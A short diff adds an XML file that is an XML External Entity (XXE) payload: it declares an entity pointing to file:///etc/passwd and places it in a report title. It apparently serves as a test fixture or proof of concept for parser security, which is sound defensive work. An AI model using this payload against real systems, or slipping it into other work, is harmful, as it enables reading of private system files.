@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE Report [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<Report><Control><Title>&xxe;</Title></Control></Report>
